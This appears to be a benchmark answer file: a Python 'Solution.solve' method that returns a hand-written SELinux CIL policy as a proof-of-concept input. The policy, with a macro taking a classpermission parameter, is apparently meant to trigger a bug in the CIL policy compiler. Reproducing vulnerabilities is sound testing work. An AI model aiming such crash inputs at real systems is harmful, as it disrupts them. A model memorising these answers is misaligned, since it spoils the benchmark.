import os
import tarfile
from typing import Optional


class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = (
            "(block b"
            " (class file (read))"
            " (classorder (file))"
            " (sensitivity s0)"
            " (sensitivityorder (s0))"
            " (type t)"
            " (typeorder (t))"
            " (role r)"
            " (roleorder (r))"
            " (user u)"
            " (userorder (u))"
            " (roletype r t)"
            " (userrole u r)"
            " (userlevel u s0)"
            " (userrange u ((s0 s0)))"
            " (sid kernel)"
            " (sidorder (kernel))"
            " (sidcontext kernel (u r t ((s0 s0))))"
            " (macro m ((classpermission cp)) (classpermissionset ps (cp)))"
            " (call m ((file (read))))"
            " (allow t t (file (read)))"
            ")\n"
        )
        return poc.encode("ascii")